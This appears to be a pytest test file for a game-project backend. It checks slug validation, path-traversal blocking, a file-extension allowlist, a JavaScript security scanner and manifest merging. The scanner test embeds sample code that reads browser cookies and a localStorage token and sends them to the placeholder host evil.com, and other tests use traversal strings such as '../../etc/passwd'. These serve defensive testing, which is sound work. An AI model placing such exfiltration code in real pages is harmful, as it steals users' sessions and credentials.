"""
Unit tests for Project Path Sanitizer, Game Code Security Scanner, and Manifest Manager.
Ensures strict sandbox boundaries, prevents directory traversal, and guards game manifests.
"""

import pytest
from pathlib import Path
from backend.app.core.errors import AppError, ErrorCategory
from backend.app.projects.sanitizer import (
    validate_slug,
    resolve_project_path,
    resolve_file_path,
    sanitize_game_code,
    is_safe_game_file
)
from backend.app.projects.manifest import (
    load_manifest,
    save_manifest,
    merge_manifest_updates,
    MANIFEST_FILENAME
)


def test_validate_slug():
    """Verifies slug validation and normalization."""
    assert validate_slug("Neon-Dodge") == "neon-dodge"
    assert validate_slug("game_123") == "game_123"
    assert validate_slug("my  game  test") == "my-game-test"

    with pytest.raises(AppError):
        validate_slug("../../etc/passwd")

    with pytest.raises(AppError):
        validate_slug("")


def test_path_traversal_prevention(tmp_path, monkeypatch):
    """Verifies that resolve_project_path and resolve_file_path strictly block escapes."""
    projects_root = tmp_path / "projects"
    projects_root.mkdir()

    from backend.app.core.config import settings
    monkeypatch.setattr(settings, "PROJECTS_DIR", projects_root)

    user_id = 12345
    slug = "test-game"

    project_dir = resolve_project_path(user_id, slug)
    assert project_dir == projects_root / str(user_id) / slug

    # Test file path containment
    project_dir.mkdir(parents=True, exist_ok=True)
    valid_file = resolve_file_path(project_dir, "app.js")
    assert valid_file == project_dir / "app.js"

    valid_nested = resolve_file_path(project_dir, "assets/audio/laser.mp3")
    assert valid_nested == project_dir / "assets" / "audio" / "laser.mp3"

    # Traversal attempts must raise AppError
    with pytest.raises(AppError):
        resolve_file_path(project_dir, "../outside.js")

    with pytest.raises(AppError):
        resolve_file_path(project_dir, "../../secret.env")

    with pytest.raises(AppError):
        resolve_file_path(project_dir, "/absolute/path/file.js")

    with pytest.raises(AppError):
        resolve_file_path(project_dir, "C:\\Windows\\System32\\cmd.exe")


def test_file_extension_allowlist():
    """Verifies allowed and disallowed file extensions."""
    assert is_safe_game_file("index.html") is True
    assert is_safe_game_file("style.css") is True
    assert is_safe_game_file("game.js") is True
    assert is_safe_game_file("level.json") is True
    assert is_safe_game_file("character.png") is True
    assert is_safe_game_file("model.gltf") is True

    # Dangerous extensions must be rejected
    assert is_safe_game_file("server.py") is False
    assert is_safe_game_file("deploy.sh") is False
    assert is_safe_game_file("virus.exe") is False
    assert is_safe_game_file(".env") is False
    assert is_safe_game_file("exploit.bat") is False


def test_sanitize_game_code_security_scanner():
    """Verifies code sanitizer flags malicious browser tampering attempts."""
    safe_code = """
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#8b5cf6';
    ctx.fillRect(10, 10, 50, 50);
    """
    clean_code, violations = sanitize_game_code(safe_code)
    assert len(violations) == 0
    assert "fillRect" in clean_code

    # Malicious code attempts
    dangerous_code = """
    const c = document.cookie;
    window.parent.location = 'https://evil.com/?c=' + c;
    fetch('https://evil.com/steal', { method: 'POST', body: localStorage.getItem('token') });
    """
    _, violations = sanitize_game_code(dangerous_code)
    assert len(violations) >= 2


def test_manifest_lifecycle(tmp_path):
    """Verifies project manifest creation, loading, and incremental merging."""
    project_dir = tmp_path / "project_a"
    project_dir.mkdir()

    # Initial manifest load when file does not exist
    manifest = load_manifest(project_dir)
    assert manifest["schema_version"] == "2.0.0"
    assert "movement" in manifest["systems"]

    # Merge updates
    updated = merge_manifest_updates(project_dir, {
        "title": "Neon Racer",
        "description": "High speed cyberpunk racing game",
        "systems": [
            {"id": "physics", "description": "2D vehicle physics engine"},
            {"id": "particle", "description": "Particle explosion manager"}
        ],
        "controls": {"Space": "Boost", "Arrows": "Steering"}
    })

    save_manifest(project_dir, updated)
    loaded = load_manifest(project_dir)

    assert loaded["title"] == "Neon Racer"
    assert len(loaded["systems"]) == 6
    assert loaded["controls"]["Space"] == "Boost"
